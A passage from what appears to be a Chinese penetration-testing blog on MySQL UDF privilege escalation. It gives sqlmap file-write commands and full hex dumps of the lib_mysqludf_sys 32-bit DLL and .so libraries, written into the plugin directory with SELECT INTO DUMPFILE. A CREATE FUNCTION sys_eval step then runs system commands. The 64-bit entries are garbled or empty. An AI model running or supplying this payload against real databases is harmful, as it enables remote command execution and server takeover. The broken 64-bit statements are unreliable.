href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/sqlmap%20udf.zip">sqlmap 解码后的动态链接库</a></p><h3 id="寻找目录插件"><a href="#寻找目录插件" class="headerlink" title="寻找目录插件"></a>寻找目录插件</h3><p>把 UDF 的动态链接库文件放到 MySQL 的插件目录下，使用SQL语句查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020100622882.png" alt="image-20211020100622882"></p><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 233 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>通过 NTFS ADS流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+------------------+</span><br><span class="line">| @@basedir        |</span><br><span class="line">+------------------+</span><br><span class="line">| /usr/local/mysql |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>写入动态链接库可以分为下面几种情形：</p><ul><li>SQL 注入且是高权限</li><li>plugin 目录可写且需要 <strong>secure_file_priv 无限制</strong></li><li>MySQL 插件目录可以被 MySQL 用户写入</li></ul><p>这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击</p><h4 id="存在sql注入使用sqlmap"><a href="#存在sql注入使用sqlmap" class="headerlink" title="存在sql注入使用sqlmap"></a>存在sql注入使用sqlmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost:30008/&quot; --data=&quot;id=1&quot; --file-write=&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot; --file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></pre></td></tr></table></figure><p><a href="http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/sqlmap_udf_mysql.zip">sqlmap_udf_mysql.zip</a></p><h4 id="没有注入点"><a href="#没有注入点" class="headerlink" title="没有注入点"></a>没有注入点</h4><p>操作原生 SQL 语句，这种情况下当 <strong>secure_file_priv 无限制</strong>的时候，我们也是可以手工写文件到 plugin 目录下的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接 SELECT 查询十六进制写入</span><br><span class="line">SELECT 0x7f454c4602... INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line">SELECT unhex(&#x27;7f454c4602...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>获取十六进制的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line">SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line">SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));</span><br></pre></td></tr></table></figure><p>一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;)) into dumpfile &#x27;/tmp/udf.txt&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile &#x27;/tmp/udf.txt&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-32-dll"><a href="#lib-mysqludf-sys-32-dll" class="headerlink" title="lib_mysqludf_sys_32.dll"></a>lib_mysqludf_sys_32.dll</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000ce393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffffc80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;E:\\phpStudy\\MySQL\\lib\\plugin\\udf32.dll&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-64-dll"><a href="#lib-mysqludf-sys-64-dll" class="headerlink" title="lib_mysqludf_sys_64.dll"></a>lib_mysqludf_sys_64.dll</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT x27;E:\\phpStudy\\MySQL\\lib\\plugin\\udf64.dll&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-32-so"><a href="#lib-mysqludf-sys-32-so" class="headerlink" title="lib_mysqludf_sys_32.so"></a>lib_mysqludf_sys_32.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666fffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf32.so&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-64-so"><a href="#lib-mysqludf-sys-64-so" class="headerlink" title="lib_mysqludf_sys_64.so"></a>lib_mysqludf_sys_64.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf64.so&#x27;;</span><br></pre></td></tr></table></figure><h3 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>可能会出现下面的报错：</p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020111041041.png" alt="image-20211020111041041" style="zoom:150%;" /><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1126 (HY000): Can&#x27;t open shared library &#x27;udf1.dll&#x27; (errno: 193 )</span><br></pre></td></tr></table></figure><p>因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</p></blockquote><p><img 